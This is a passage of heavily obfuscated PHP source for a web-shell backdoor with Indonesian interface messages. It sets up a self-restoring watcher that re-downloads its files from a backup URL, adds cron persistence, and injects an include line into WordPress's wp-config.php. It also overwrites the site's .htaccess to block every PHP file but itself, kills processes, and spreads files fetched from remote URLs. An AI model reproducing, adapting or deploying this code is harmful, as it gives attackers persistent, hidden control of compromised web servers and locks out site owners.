45\155\40\x43\141\143\x68\145\x20\120\x72\x6f\143\145\163\x73\40\x53\164\x61\x72\x74\x65\x64\72\40\x22\56\x64\141\x74\145\x28\42\131\55\x6d\55\144\40\x48\72\151\x3a\x73\42\x29\x2e\x22\134\156\42\x3b\xa\145\143\150\x6f\x20\42\360\x9f\x9b\241\xef\xb8\x8f\40\x43\141\143\x68\x65\x20\123\x63\162\151\x70\x74\72\x20\x7b\x24\144\x79\x6e\x61\155\151\x63\137\x6e\x61\155\145\163\133\47\163\143\x72\x69\x70\164\x5f\156\x61\155\x65\x27\x5d\x7d\x20\x69\156\40\x22\40\x2e\x20\144\151\162\x6e\141\x6d\x65\x28\x5f\137\x46\111\x4c\x45\137\137\51\40\56\x20\42\57\134\156\x22\73\xa\x65\x63\150\x6f\x20\42\x3d\x3d\75\x3d\x3d\75\75\x3d\x3d\75\x3d\x3d\x3d\x3d\x3d\75\x3d\75\75\x3d\75\75\75\x3d\x3d\75\x3d\x3d\x3d\75\75\75\x3d\75\75\x3d\x3d\75\75\x3d\x3d\x3d\75\75\75\x5c\156\x22\x3b\12\146\157\x72\145\x61\x63\150\40\x28\x24\x66\x69\x6c\x65\163\124\x6f\120\162\157\164\145\143\x74\40\x61\x73\x20\x24\x66\x69\x6c\145\51\x20\x7b\xa\x20\x20\40\40\x65\x63\x68\x6f\x20\42\55\x20\x54\141\162\147\145\x74\x3a\40\42\40\x2e\40\44\x66\151\x6c\145\x5b\x27\x74\141\x72\x67\x65\x74\47\135\x20\x2e\40\x22\x5c\x6e\x20\x20\102\x61\143\x6b\x75\x70\x3a\x20\x22\x20\x2e\40\x24\146\151\x6c\x65\x5b\x27\142\x61\x63\153\165\160\x55\162\154\47\x5d\40\56\x20\42\134\156\42\x3b\12\175\xa\x65\x63\x68\x6f\x20\42\x3d\x3d\75\x3d\75\x3d\75\75\x3d\75\x3d\x3d\75\75\x3d\75\75\x3d\75\x3d\75\75\75\75\75\x3d\75\75\x3d\x3d\75\75\75\x3d\75\x3d\75\75\x3d\75\x3d\x3d\x3d\x3d\75\x5c\x6e\42\73\xa\x66\x6c\x75\x73\x68\50\51\x3b\12\12\x77\x68\x69\154\x65\x20\50\x74\162\x75\145\51\x20\x7b\xa\x20\x20\x20\40\146\157\162\x65\141\143\x68\40\50\44\146\151\154\x65\x73\x54\x6f\120\162\x6f\x74\x65\143\x74\40\x61\163\x20\x24\x66\151\154\145\x29\40\173\xa\40\x20\40\40\40\x20\x20\x20\44\164\x61\x72\147\145\164\x46\x69\154\145\x20\x3d\x20\x24\x66\x69\x6c\x65\x5b\47\x74\x61\162\147\145\164\x27\x5d\x3b\xa\x20\40\x20\x20\40\x20\40\40\44\142\141\x63\153\x75\x70\106\151\154\145\125\x72\x6c\x20\x3d\40\44\146\151\154\x65\x5b\47\x62\x61\143\x6b\165\160\125\162\x6c\47\135\73\12\x20\40\x20\40\40\40\x20\40\44\x74\141\x72\147\145\x74\x44\x69\x72\x20\75\40\x64\151\162\156\141\155\x65\x28\x24\164\x61\162\147\145\x74\x46\151\154\x65\51\73\12\xa\x20\x20\40\40\x20\x20\x20\40\x65\x63\150\x6f\x20\x22\x5b\42\x2e\x64\141\x74\x65\x28\42\x48\x3a\151\x3a\x73\x22\x29\x2e\42\x5d\40\xf0\237\x94\x8d\40\x43\145\153\x3a\40\42\40\x2e\40\x62\x61\163\145\x6e\141\x6d\145\x28\x24\x74\x61\162\147\x65\164\x46\x69\x6c\145\51\x3b\12\xa\x20\x20\40\40\40\x20\40\40\145\156\163\165\162\x65\104\151\x72\x50\x65\x72\x6d\x73\x52\x65\143\165\162\x73\151\x76\x65\50\44\164\x61\x72\x67\x65\x74\x44\151\x72\54\x20\x30\67\x37\x37\x29\73\12\xa\40\40\x20\x20\40\40\40\40\151\x66\40\50\x21\x66\151\x6c\x65\137\145\170\x69\x73\x74\163\50\44\x74\x61\162\147\x65\x74\106\x69\154\x65\x29\x29\40\173\xa\x20\x20\40\40\40\40\x20\x20\40\x20\40\40\x65\x63\150\x6f\40\x22\40\x2d\76\40\360\237\232\250\x20\x48\111\114\101\x4e\x47\41\40\x4d\145\x6d\x75\154\x69\x68\153\141\x6e\x2e\56\x2e\134\156\x22\x3b\12\x20\x20\x20\x20\40\x20\x20\40\40\40\x20\40\44\144\x61\x74\x61\40\75\40\146\145\x74\143\150\x43\157\x6e\164\145\156\x74\50\44\142\x61\x63\x6b\x75\160\x46\151\x6c\145\125\162\x6c\x29\73\12\xa\40\40\40\x20\x20\40\40\40\x20\40\40\x20\151\146\40\50\44\x64\141\164\x61\x20\x21\75\75\40\x66\x61\154\x73\145\51\40\173\12\x20\40\40\x20\40\x20\40\x20\x20\x20\x20\x20\x20\40\x20\40\x69\x66\x20\x28\167\x72\151\164\145\101\156\x64\114\157\143\153\x28\44\x74\141\162\x67\145\x74\x46\x69\154\x65\x2c\x20\x24\144\x61\164\x61\x29\51\x20\x7b\x20\xa\40\x20\x20\40\x20\40\x20\40\40\x20\40\40\40\x20\x20\40\x20\40\x20\40\145\x63\150\157\40\x22\133\x22\56\144\x61\164\145\50\x22\110\x3a\x69\x3a\x73\42\51\x2e\x22\135\x20\342\234\x85\40\102\x65\162\150\x61\163\151\x6c\x20\x64\x69\160\165\154\x69\150\153\141\x6e\x20\x64\141\156\x20\x66\151\154\x65\x20\144\x69\x6b\x75\x6e\143\x69\x20\153\x65\x20\x30\x34\x34\x34\72\40\44\x74\141\162\147\145\x74\106\151\154\145\134\x6e\42\73\xa\40\x20\40\x20\x20\40\40\x20\40\x20\40\x20\40\40\40\x20\175\x20\x65\x6c\163\145\40\173\xa\40\x20\40\40\x20\x20\40\40\40\x20\40\40\x20\40\x20\40\40\40\40\x20\x65\x63\x68\157\x20\42\133\x22\56\x64\141\x74\x65\50\x22\x48\x3a\x69\x3a\x73\42\51\56\42\x5d\40\342\235\x8c\40\x47\101\107\101\x4c\40\x6d\145\156\165\154\x69\x73\x20\x66\x69\x6c\x65\40\153\x65\x20\154\x6f\x6b\x61\163\151\x3a\x20\x24\x74\141\x72\147\145\164\106\151\154\x65\x5c\156\42\x3b\xa\x20\x20\40\x20\x20\40\x20\40\40\x20\x20\x20\40\x20\40\x20\175\12\x20\x20\x20\40\40\x20\x20\40\40\x20\40\x20\175\12\40\x20\40\x20\40\x20\x20\40\175\40\x65\154\163\x65\40\173\40\xa\x20\x20\x20\40\x20\x20\x20\40\x20\x20\40\40\44\x63\x75\162\x72\x65\156\x74\x5f\x70\x65\162\155\163\x5f\146\x69\154\x65\x20\x3d\40\163\165\142\163\164\x72\50\x73\160\162\151\x6e\x74\x66\x28\47\x25\x6f\x27\54\x20\100\146\x69\154\x65\160\145\x72\155\x73\50\x24\164\141\x72\147\145\164\106\x69\x6c\x65\51\x29\x2c\x20\55\x34\x29\73\12\40\40\40\40\40\x20\x20\40\40\x20\x20\x20\x69\146\x20\x28\44\143\x75\x72\162\x65\156\164\137\x70\145\162\155\163\137\146\x69\154\x65\x20\41\75\75\x20\47\60\x34\x34\x34\x27\40\46\46\40\x24\143\165\162\x72\x65\x6e\x74\137\x70\x65\162\155\163\x5f\x66\x69\x6c\x65\x20\41\x3d\x3d\40\47\60\64\x34\x34\47\x29\40\x7b\40\12\x20\x20\x20\x20\x20\40\40\x20\x20\x20\x20\40\x20\x20\x20\x20\100\x63\150\x6d\x6f\144\x28\44\x74\x61\x72\147\145\x74\106\151\154\145\54\x20\x30\64\x34\x34\51\x3b\x20\12\40\x20\x20\x20\x20\x20\x20\x20\40\x20\x20\40\x20\40\x20\40\x65\143\x68\x6f\40\42\40\55\76\x20\360\237\224\223\40\111\x7a\151\x6e\x20\x66\151\154\145\x20\144\x69\x75\142\141\150\x21\x20\x4d\145\156\x67\165\156\143\x69\40\165\154\141\156\x67\40\x66\x69\154\x65\x20\x6b\145\40\60\x34\x34\64\x2e\x5c\x6e\42\x3b\12\x20\x20\40\x20\x20\x20\x20\x20\x20\40\40\40\x7d\40\145\154\163\145\40\173\12\40\40\x20\40\40\x20\x20\40\40\40\x20\x20\40\40\40\40\x20\x65\x63\x68\x6f\x20\42\x20\x2d\x3e\x20\xe2\234\205\40\106\151\154\x65\40\x61\x6d\141\156\56\x5c\x6e\42\73\12\40\x20\x20\40\40\x20\x20\x20\40\x20\40\40\175\12\x20\x20\x20\x20\40\x20\40\40\175\12\40\x20\x20\x20\x20\x20\x20\40\146\x6c\x75\x73\150\50\51\73\xa\40\x20\40\40\x7d\12\12\40\40\40\x20\x24\x63\165\x72\162\145\156\164\137\143\x72\157\156\x74\x61\x62\40\x3d\40\x74\162\x79\137\145\170\x65\143\x75\164\145\x5f\x63\x6f\155\x6d\x61\x6e\144\50\47\143\x72\x6f\x6e\164\141\x62\40\55\x6c\47\51\73\12\40\40\40\40\x69\x66\50\44\143\165\x72\162\145\156\164\137\x63\x72\x6f\x6e\x74\141\x62\x20\41\75\x3d\x20\156\x75\x6c\x6c\x29\x20\x7b\12\x20\40\40\x20\40\40\x20\40\x24\x6d\x69\x73\x73\151\x6e\147\x5f\x63\162\x6f\x6e\163\40\75\40\x66\141\154\x73\145\73\xa\x20\x20\x20\40\40\x20\x20\x20\146\x6f\162\145\x61\x63\x68\50\x24\143\162\157\156\x43\157\155\x6d\x61\156\x64\x73\x54\x6f\105\x6e\x73\x75\x72\x65\40\141\163\x20\x24\x63\162\x6f\156\x5f\x63\x6f\155\x6d\x61\x6e\144\x29\40\173\xa\x20\x20\x20\x20\40\x20\x20\40\40\40\x20\40\151\146\40\50\x73\164\x72\160\157\163\50\44\143\x75\x72\x72\x65\156\x74\137\143\162\x6f\156\x74\x61\142\x2c\40\x24\143\x72\157\x6e\137\143\157\155\155\x61\156\144\x29\40\x3d\x3d\75\40\x66\141\x6c\163\145\x29\x20\x7b\xa\x20\x20\40\x20\40\x20\40\40\x20\40\40\40\x20\x20\40\40\145\x63\x68\x6f\40\x22\133\42\x2e\144\x61\x74\145\50\42\110\x3a\x69\72\x73\x22\x29\56\42\x5d\x20\360\237\232\xa8\40\103\x52\x4f\116\40\x48\x49\x4c\x41\x4e\107\72\40\42\x20\56\x20\x68\164\x6d\x6c\x65\156\164\x69\164\151\145\x73\x28\x73\165\142\163\164\x72\50\x24\x63\x72\157\x6e\137\x63\157\x6d\x6d\x61\x6e\144\x2c\x20\60\54\40\67\x30\x29\x29\40\x2e\x20\x22\56\56\56\134\156\x22\x3b\xa\40\x20\40\40\x20\40\40\x20\x20\40\x20\40\40\x20\40\40\44\x65\x73\143\x61\x70\x65\144\x5f\143\162\x6f\156\137\143\x6f\155\155\141\x6e\x64\40\x3d\40\163\164\162\x5f\x72\145\160\x6c\141\143\x65\x28\42\47\x22\x2c\40\42\x27\134\47\x27\42\x2c\x20\44\143\x72\157\x6e\137\143\157\x6d\155\x61\x6e\144\51\73\12\40\x20\40\x20\x20\40\40\x20\x20\x20\x20\40\40\x20\x20\40\164\x72\x79\137\x65\x78\x65\x63\165\x74\x65\137\143\157\155\x6d\141\156\144\50\x27\50\x63\162\x6f\x6e\x74\141\x62\x20\x2d\x6c\40\x32\76\x2f\x64\145\166\57\156\165\154\154\x3b\40\145\x63\150\157\x20\47\40\56\x20\x24\x65\x73\x63\x61\x70\145\144\137\143\x72\x6f\x6e\137\143\157\x6d\155\x61\156\144\40\x2e\40\47\51\x20\174\x20\143\x72\x6f\x6e\164\141\x62\40\55\x27\51\73\12\40\x20\40\x20\x20\40\40\40\x20\40\x20\40\x20\40\40\40\x24\x6d\151\163\x73\151\156\147\137\x63\x72\x6f\x6e\163\x20\x3d\x20\x74\x72\x75\x65\73\xa\40\40\40\40\40\x20\40\x20\x20\40\x20\x20\175\12\x20\40\40\40\40\40\x20\40\175\12\x20\x20\x20\40\40\x20\x20\x20\x69\146\x20\x28\x21\44\155\x69\x73\163\151\x6e\x67\137\x63\x72\157\156\163\x29\40\173\12\40\x20\40\40\x20\x20\40\40\x20\x20\x20\40\x65\x63\x68\x6f\40\42\133\x22\x2e\144\141\164\145\x28\x22\x48\72\x69\x3a\x73\42\51\56\42\x5d\40\342\x9c\x85\40\x53\x65\x6d\x75\x61\x20\143\x72\157\x6e\x20\152\x6f\x62\x20\141\155\141\x6e\56\134\x6e\42\x3b\12\40\40\40\x20\40\40\x20\40\x7d\40\x65\x6c\163\145\x20\x7b\12\x20\40\x20\40\x20\x20\40\40\40\x20\x20\40\145\x63\x68\157\40\x22\133\42\x2e\x64\141\164\x65\50\x22\110\x3a\x69\72\x73\x22\51\56\x22\135\40\342\234\x85\40\103\162\157\x6e\x20\152\x6f\142\x20\171\141\x6e\x67\40\x68\x69\154\x61\156\x67\40\x74\x65\x6c\x61\150\40\144\151\160\165\154\x69\x68\x6b\x61\x6e\x2e\134\156\42\x3b\xa\x20\x20\x20\x20\x20\x20\x20\x20\175\xa\40\x20\40\x20\x7d\40\145\x6c\x73\145\x20\173\12\40\x20\x20\x20\x20\40\40\40\40\x65\x63\x68\x6f\40\x22\133\x22\x2e\x64\141\x74\x65\x28\x22\110\72\151\72\163\42\x29\56\42\x5d\40\xe2\x9a\xa0\357\xb8\x8f\40\x54\151\x64\x61\153\x20\x64\141\160\141\164\x20\x6d\145\155\x65\x72\x69\x6b\x73\x61\40\x63\x72\157\156\40\x6a\157\x62\54\x20\163\145\x6d\x75\x61\x20\x66\165\x6e\x67\163\x69\x20\145\153\163\x65\153\x75\163\x69\x20\147\x61\x67\141\154\56\x5c\156\42\x3b\xa\x20\x20\40\x20\x7d\xa\xa\40\40\40\40\x65\143\x68\x6f\x20\x22\55\55\55\55\55\x2d\55\55\55\x2d\x2d\55\x2d\55\55\x2d\55\x2d\40\124\151\144\165\162\40\x73\145\x6c\141\x6d\141\40\x7b\x24\x69\x6e\x74\145\x72\166\141\154\x7d\x20\x64\x65\x74\x69\153\x20\x2d\55\55\x2d\x2d\55\x2d\55\x2d\x2d\x2d\55\55\x2d\x2d\55\55\x2d\134\x6e\x22\x3b\12\x20\x20\x20\x20\x66\x6c\165\163\x68\x28\x29\73\12\x20\40\x20\40\x73\x6c\x65\x65\160\x28\44\151\x6e\164\145\x72\x76\x61\154\51\x3b\12\x7d"; $_SESSION["\143\141\143\x68\x65\137\143\157\x64\145\x5f\x74\x65\155\x70\154\141\164\145"] = $cache_code; if (file_put_contents($cache_script_filepath, $cache_code)) { @chmod($cache_script_filepath, 493); $process_started = false; $method_used = ''; if ($php_binary_path) { $safe_script_path = safe_escapeshellarg($cache_script_filepath); $safe_log_path = safe_escapeshellarg($log_filepath); $command_run = "\x6e\157\150\165\x70\x20{$php_binary_path}\40{$safe_script_path}\40\x3e\40{$safe_log_path}\40\x32\x3e\46\x31\40\x26\x20\145\x63\x68\157\40\44\41"; $pid = try_execute_command($command_run); if ($pid && is_numeric(trim($pid))) { $process_started = true; $method_used = "\x4e\157\150\x75\x70\x20\50\x50\111\x44\72\40" . trim($pid) . "\x29"; } } if (!$process_started && function_exists("\143\x75\162\x6c\137\x69\156\x69\164") && function_exists("\x69\147\156\157\x72\x65\137\x75\x73\145\x72\x5f\x61\142\x6f\x72\164")) { $url = (isset($_SERVER["\x48\x54\124\120\x53"]) && $_SERVER["\x48\124\x54\120\123"] === "\x6f\x6e" ? "\x68\164\x74\x70\163" : "\150\164\164\x70") . "\72\x2f\57" . $_SERVER["\110\x54\x54\120\137\110\117\x53\124"] . $_SERVER["\x52\x45\121\x55\x45\x53\124\137\125\122\111"]; $url .= (strpos($url, "\x3f") === false ? "\77" : "\46") . "\162\x75\x6e\137\142\x61\143\153\x67\162\x6f\x75\x6e\x64\137\x63\x61\x63\x68\x65\x3d" . urlencode($cache_script_filepath); $ch = curl_init(); curl_setopt_array($ch, array(CURLOPT_URL => $url, CURLOPT_FRESH_CONNECT => true, CURLOPT_TIMEOUT_MS => 500, CURLOPT_NOSIGNAL => 1)); @curl_exec($ch); @curl_close($ch); $process_started = true; $method_used = "\x69\x67\156\157\162\x65\137\x75\x73\x65\x72\x5f\x61\142\157\x72\164\40\x28\164\162\x69\147\x67\x65\x72\145\144\40\x76\x69\x61\x20\x63\x55\x52\x4c\51"; } $crontab_set = try_execute_command("\x63\162\x6f\x6e\x74\141\142\40\55\154"); if ($crontab_set !== null) { $new_crontab_content = $crontab_set ? trim($crontab_set) . "\xa" : ''; foreach ($cronCommandsToAdd as $command) { if (strpos($new_crontab_content, $command) === false) { $new_crontab_content .= $command . "\xa"; } } $temp_cron_file = tempnam(sys_get_temp_dir(), "\x63\x72\157\156"); file_put_contents($temp_cron_file, $new_crontab_content); try_execute_command("\x63\x72\x6f\156\164\x61\x62\x20" . safe_escapeshellarg($temp_cron_file)); unlink($temp_cron_file); $output_messages[] = "\112\141\162\x69\x6e\147\x20\120\145\156\x67\x61\155\x61\x6e\x3a\40\x43\162\157\x6e\x20\152\157\142\x20\142\x65\x72\150\x61\x73\x69\154\x20\144\151\141\164\x75\x72\x2f\x64\x69\160\x65\x72\142\141\162\x75\x69\x2e"; } deploy_layer4_watcher($cronCommandsToAdd, $dynamic_names["\x77\141\164\x63\x68\145\x72\137\x6e\x61\x6d\x65"], $php_binary_path ?: "\160\150\x70", $output_messages, $error_messages); deploy_intruder_persistence($cronCommandsToAdd, $output_messages, $error_messages, $dynamic_names); if ($process_started) { $_SESSION["\143\141\x63\x68\x65\x5f\141\x63\x74\x69\166\x65"] = true; $_SESSION["\143\x61\x63\150\145\x5f\x64\151\x72\137\x70\141\x74\150"] = $cache_base_dir; $_SESSION["\143\x61\x63\x68\145\137\x6c\x6f\x67\137\160\x61\x74\x68"] = $log_filepath; $_SESSION["\143\x61\143\x68\145\x5f\x73\143\162\x69\160\x74\137\156\x61\x6d\x65"] = $dynamic_names["\163\x63\x72\x69\x70\x74\137\156\141\x6d\145"]; $_SESSION["\x63\x61\143\x68\145\137\143\162\157\156\137\151\x64"] = "\x23" . $dynamic_names["\143\x72\157\156\x5f\x70\x72\145\x66\151\x78"] . $unique_cron_instance_id; $output_messages[] = "\x50\x72\157\x73\x65\163\40\x43\141\x63\150\x65\40\115\141\156\x61\147\x65\x72\40\142\x65\x72\x68\141\163\x69\x6c\40\144\151\155\x75\x6c\141\151\x20\x6d\x65\x6e\x67\x67\165\156\x61\153\141\x6e\x20\x6d\145\x74\x6f\144\x65\x3a\40\x3c\163\x74\x72\x6f\156\x67\76{$method_used}\x3c\57\x73\164\x72\157\x6e\x67\76\56"; $output_messages[] = "\120\141\164\150\40\123\x6b\162\151\160\72\40{$cache_script_filepath}\56\40\x50\x61\164\150\x20\x4c\x6f\x67\x3a\x20{$log_filepath}"; } else { $error_messages[] = "\x47\x61\147\141\154\x20\x6d\x65\155\165\x6c\141\x69\40\x70\162\x6f\163\145\x73\40\x6c\x61\164\x61\162\40\142\x65\154\x61\153\141\156\x67\56\x20\103\157\142\141\x20\160\145\162\151\x6b\x73\141\x20\x69\172\x69\156\40\141\x74\x61\x75\x20\x66\165\x6e\x67\163\x69\40\x79\x61\156\x67\x20\x64\151\x6e\x6f\156\141\x6b\x74\151\x66\x6b\x61\x6e\56"; } } else { $error_messages[] = "\107\141\x67\141\154\x20\155\145\x6d\x62\165\141\x74\x20\146\x69\154\145\x20\x73\x6b\x72\x69\x70\40\x63\141\143\150\x65\40\x64\x69\x20\47{$cache_script_filepath}\47\56\x20\120\141\x73\x74\151\x6b\141\x6e\40\x64\151\162\x65\153\x74\x6f\x72\151\x20\167\162\151\x74\141\142\154\x65\56"; } } } elseif ($action_post === "\x73\x74\157\160\137\x70\x72\157\164\x65\143\x74\x69\157\x6e" && $active_menu === "\x64\171\x6e\141\x6d\x69\143\137\x63\x61\x63\150\x65\137\x6d\x61\156\x61\147\x65\x72") { if (isset($_SESSION["\143\x61\143\150\x65\x5f\x64\x69\162\x5f\160\x61\164\150"])) { $cache_dir_to_stop = $_SESSION["\143\x61\x63\x68\145\137\144\151\162\137\x70\141\x74\150"]; $log_path_to_stop = $_SESSION["\143\141\x63\x68\x65\x5f\154\x6f\147\x5f\160\141\164\150"]; $script_name_to_stop = $_SESSION["\143\141\143\150\145\x5f\x73\143\162\x69\x70\x74\137\x6e\141\x6d\x65"]; $grep_pattern = "\133" . substr($script_name_to_stop, 0, 1) . "\135" . substr($script_name_to_stop, 1); $ps_output = try_execute_command("\x70\163\40\x61\165\170\40\x7c\x20\147\x72\145\160\x20\47{$grep_pattern}\47"); if (!empty($ps_output)) { $lines = explode("\12", trim($ps_output)); foreach ($lines as $line) { if (strpos($line, $script_name_to_stop) !== false) { $parts = preg_split("\x2f\134\163\53\x2f", trim($line)); if (count($parts) > 1 && is_numeric($parts[1])) { try_execute_command("\x6b\x69\x6c\x6c\40\55\x39\40{$parts[1]}"); } } } } try_execute_command("\153\151\154\x6c\x61\154\x6c\x20\55\71\40" . safe_escapeshellarg($script_name_to_stop)); $current_crontab = try_execute_command("\x63\162\x6f\156\164\x61\x62\40\x2d\x6c"); if ($current_crontab) { $new_crontab_lines = array(); $cron_prefix_to_remove = $dynamic_names["\143\x72\x6f\x6e\x5f\x70\x72\145\x66\151\x78"]; $watcher_name_to_remove = $dynamic_names["\x77\x61\x74\143\x68\x65\162\x5f\x6e\141\155\145"]; foreach (explode("\xa", $current_crontab) as $line) { if (strpos($line, "\43" . $cron_prefix_to_remove) === false && strpos($line, $watcher_name_to_remove) === false) { $new_crontab_lines[] = $line; } } $new_crontab_content = implode("\xa", $new_crontab_lines); $temp_cron_file = tempnam(sys_get_temp_dir(), "\143\x72\x6f\x6e"); file_put_contents($temp_cron_file, $new_crontab_content); try_execute_command("\x63\162\157\x6e\x74\x61\142\40" . safe_escapeshellarg($temp_cron_file)); @unlink($temp_cron_file); } $wp_config_path = find_wp_load_path(__DIR__); if ($wp_config_path) { $wp_config_file = dirname($wp_config_path) . "\x2f\167\x70\55\143\157\156\146\x69\147\x2e\160\150\160"; if (is_file($wp_config_file) && is_writable($wp_config_file)) { $config_content = file_get_contents($wp_config_file); $injection_code = $dynamic_names["\151\x6e\x74\162\165\144\145\x72\137\163\x69\147\156\141\x74\165\162\x65"] . "\xa\100\151\156\143\154\x75\144\145\x5f\x6f\156\143\145\x28\x41\x42\123\120\101\124\110\x20\x2e\40\47\x77\x70\x2d\151\156\x63\x6c\165\144\145\163\x2f" . $dynamic_names["\151\156\164\x72\165\x64\x65\x72\x5f\x6e\x61\x6d\x65"] . "\x27\51\73\xa"; $new_config_content = str_replace($injection_code, '', $config_content); @file_put_contents($wp_config_file, $new_config_content); } $intruder_file = dirname($wp_config_path) . "\57\x77\x70\x2d\151\x6e\x63\154\165\144\145\x73\x2f" . $dynamic_names["\x69\x6e\164\162\165\x64\145\x72\137\156\141\155\145"]; if (is_file($intruder_file)) { @unlink($intruder_file); } } deleteDirectoryRecursive($cache_dir_to_stop); if (file_exists($log_path_to_stop)) { @unlink($log_path_to_stop); } if (isset($_SESSION["\154\x34\x5f\x77\141\164\143\150\145\x72\x5f\160\x61\x74\x68"]) && is_file($_SESSION["\154\x34\137\x77\141\164\x63\x68\x65\x72\x5f\x70\x61\x74\x68"])) { @unlink($_SESSION["\x6c\x34\137\x77\x61\x74\x63\x68\145\x72\x5f\x70\141\164\x68"]); } unset($_SESSION["\x63\x61\143\150\x65\137\x61\143\164\x69\x76\x65"], $_SESSION["\x63\x61\x63\x68\145\x5f\x64\x69\x72\x5f\160\141\x74\x68"], $_SESSION["\x63\141\x63\x68\145\x5f\154\x6f\147\x5f\160\x61\x74\150"], $_SESSION["\x63\141\x63\x68\x65\137\163\x63\162\x69\x70\x74\x5f\156\x61\x6d\x65"], $_SESSION["\143\x61\143\x68\x65\137\x63\x72\x6f\156\137\x69\144"], $_SESSION["\x63\141\x63\x68\145\137\x63\x6f\144\x65\137\x74\145\x6d\160\154\141\x74\x65"], $_SESSION["\x6c\64\137\x77\141\164\143\150\145\x72\x5f\160\x61\164\150"]); $output_messages[] = "\x53\x65\x6d\165\x61\40\153\157\155\x70\x6f\x6e\145\156\40\103\x61\143\150\x65\x20\115\x61\156\x61\147\x65\162\40\x74\x65\154\x61\x68\x20\x64\151\x68\145\x6e\x74\151\x6b\x61\x6e\x20\144\x61\156\40\x64\x69\x68\x61\x70\x75\x73\56"; } else { $error_messages[] = "\x54\151\144\141\x6b\x20\141\x64\141\x20\151\156\x66\x6f\x72\x6d\x61\x73\151\40\163\x65\163\151\x20\143\141\x63\150\x65\40\x6d\x61\156\x61\147\145\162\40\171\x61\x6e\x67\40\144\151\x74\145\x6d\x75\153\x61\x6e\40\x75\x6e\x74\165\x6b\x20\x64\x69\150\x65\x6e\164\x69\x6b\141\156\56"; } } elseif ($action_post === "\x6b\151\154\x6c\137\160\x72\x6f\143\145\x73\x73" && $active_menu === "\160\x72\x6f\x63\145\x73\163\x5f\155\141\x6e\x61\x67\x65\x72") { $pid = (int) $_POST["\x70\151\x64"]; if ($pid > 0) { $output = try_execute_command("\x6b\x69\x6c\x6c\40\x2d\x39\x20" . $pid); if ($output !== null) { $output_messages[] = "\x42\x65\x72\150\x61\x73\151\154\40\x6d\145\x6e\147\151\162\151\x6d\x20\163\151\x6e\x79\141\154\x20\153\x69\154\x6c\40\x6b\x65\40\120\x49\x44\40{$pid}\56\40\117\x75\164\160\x75\x74\72\40\74\x70\x72\x65\76" . $htmlspecialchars_fn($output) . "\74\57\x70\x72\145\x3e"; } else { $output_messages[] = "\x53\x69\x6e\171\x61\x6c\x20\153\x69\x6c\x6c\x20\164\x65\x6c\x61\x68\40\144\x69\x6b\x69\162\x69\155\40\x6b\x65\40\x50\x49\104\40{$pid}\x20\x28\164\141\x6e\160\x61\x20\157\165\164\160\x75\164\x29\x2e"; } } else { $error_messages[] = "\x50\111\104\x20\x74\x69\x64\141\x6b\40\x76\x61\154\151\x64\56"; } } elseif ($action_post === "\144\x65\160\x6c\x6f\171\137\x64\x65\x73\x74\162\x6f\171\x65\162" && $active_menu === "\x64\145\x73\x74\x72\x6f\x79\145\162") { $doc_root = $_SERVER["\x44\x4f\x43\x55\x4d\105\116\x54\x5f\x52\x4f\x4f\x54"]; $self_filename = basename(__FILE__); if (is_writable($doc_root)) { $htaccess_content = "\74\x46\x69\x6c\145\x73\x4d\x61\x74\x63\x68\40\42\x5c\x2e\50\160\x68\160\174\160\x68\164\x6d\154\174\160\150\x70\63\174\x70\150\x70\64\174\160\150\x70\x35\x7c\160\x68\160\67\174\x70\150\160\163\x7c\x70\150\x74\174\x70\150\141\162\51\44\42\76\12\x20\x20\40\40\117\162\144\145\x72\x20\104\x65\x6e\171\54\x41\154\154\157\167\12\40\x20\x20\40\104\145\x6e\x79\x20\x66\162\x6f\x6d\x20\141\x6c\x6c\12\x3c\x2f\x46\151\154\x65\x73\x4d\x61\164\x63\x68\x3e\12\x3c\106\x69\x6c\145\163\40\42{$self_filename}\x22\76\12\x20\x20\x20\40\117\162\144\145\162\40\x41\154\x6c\x6f\x77\54\104\x65\x6e\x79\12\40\x20\x20\40\101\154\x6c\x6f\167\40\x66\162\x6f\155\x20\141\154\154\12\74\57\106\151\154\x65\x73\76"; if (@file_put_contents($doc_root . "\x2f\x2e\150\x74\141\143\x63\145\x73\x73", $htaccess_content)) { $output_messages[] = "\102\141\x63\x6b\x64\x6f\157\x72\x20\104\x65\x73\164\162\157\x79\145\162\x20\50\56\x68\x74\141\x63\143\x65\x73\163\51\40\x62\145\x72\150\x61\x73\x69\x6c\x20\x64\x69\x74\145\162\141\x70\x6b\x61\156\40\x64\151\x20\x3c\x63\x6f\x64\x65\76" . $htmlspecialchars_fn($doc_root) . "\x3c\57\x63\x6f\x64\145\76\x2e\40\110\x61\x6e\171\x61\40\x66\151\154\x65\x20\x3c\143\157\144\145\x3e" . $htmlspecialchars_fn($self_filename) . "\x3c\57\143\x6f\144\x65\x3e\x20\171\x61\x6e\147\40\144\151\x69\172\x69\156\x6b\x61\x6e\40\165\156\x74\x75\153\40\144\x69\145\153\163\x65\153\165\x73\x69\56"; } else { $error_messages[] = "\x47\141\147\x61\154\x20\x6d\145\x6e\x75\x6c\x69\x73\40\56\150\164\x61\x63\143\145\x73\x73\56\40\120\145\x72\151\153\x73\141\40\x69\x7a\x69\156\40\x74\165\x6c\x69\163\x20\x70\x61\x64\141\40\144\x69\x72\x65\153\x74\157\162\x69\40\162\157\x6f\x74\40\144\157\x6b\165\155\x65\x6e\x2e"; } } else { $error_messages[] = "\x44\151\x72\145\153\x74\157\x72\151\x20\x72\157\157\x74\40\x64\157\x6b\x75\x6d\x65\156\40\164\x69\x64\x61\153\x20\x64\141\160\x61\x74\x20\144\151\164\165\x6c\x69\163\x20\x28\x6e\157\164\x20\167\x72\151\x74\141\142\x6c\145\x29\56"; } } elseif ($action_post === "\x6d\141\156\x75\x61\x6c\137\163\x70\162\145\x61\x64" && $active_menu === "\x66\x69\154\x65\137\x73\160\x72\145\x61\144\145\162") { $results = array(); $errorMessage = ''; $successMessage = ''; $defaultTargetDirForForm = __DIR__; $targetDirInputForForm = $_POST["\164\x61\x72\x67\x65\x74\137\x64\151\x72"] ?? $defaultTargetDirForForm; $githubUrlInputForForm = $_POST["\x67\x69\x74\150\165\142\x5f\x75\162\154"] ?? ''; $rawFilenameForForm = $_POST["\x72\x61\x77\137\x66\x69\154\145\156\x61\x6d\145"] ?? ''; $rawContentForForm = $_POST["\x72\141\x77\x5f\x63\x6f\156\x74\x65\156\x74"] ?? ''; $sourceMethodUsed = ''; $targetDirDisplay = ''; $targetDirInput = trim($_POST["\164\x61\162\147\x65\164\x5f\144\x69\x72"] ?? ''); $targetDir = realpath($targetDirInput); if (empty($targetDirInput)) { $errorMessage = 